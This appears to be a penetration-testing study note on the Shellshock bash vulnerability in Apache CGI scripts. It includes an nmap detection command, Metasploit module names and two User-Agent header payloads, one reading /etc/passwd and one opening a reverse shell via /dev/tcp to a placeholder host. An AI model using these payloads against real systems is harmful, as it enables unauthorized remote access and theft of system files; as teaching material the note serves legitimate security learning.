One of the biggest Linux vulns over the last 15-20 years. Allows attacker to execute arbitrary commands via RCE.

Actually a family of vulns in the bash shell that allow an attacker to execute remote code. Not very common, and you will likely not encounter it in the wild.

Bash mistakenly executes trailing commands after a series of characters  () { :; };

Impacts CGI scripts or .sh scripts that are also vulnerable to this attack. CGI scripts are used by apache to execute arbitary commands on the linux system after which the output is displayed to the client.

In order to exploit this vuln you need to locate an input vector or script that allows you to communicate. In the context of an apache web server we can utilize any legitimate CGI script accessible on the web server. When the script is executed the web server will initiate a new process and run the CGI script with bash. Can be exploited with an MSF module.

To scan for this vuln you can use nmap like so
nmap ip.addr -sV -p 80 --script=http-shellshock --script-args="http-shellshock.uri=/script.cgi"

You can also use the metasploit scanner:
auxiliary/scanner/http/apache_mod_cgi_bash_env

Now any input after  () { :; }; will be interpreted by the server.

example:
User-Agent: ()P{:;}; echo; echo; /bin/bash -c 'cat /etc/passwd'
User-Agent: ()P{:;}; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/ip.addr/port 0>&1'

With Metasploit:

exploit/multi/http/apache_mod_cgi_bash_env_exec
( set RHOSTS and TARGETURI )
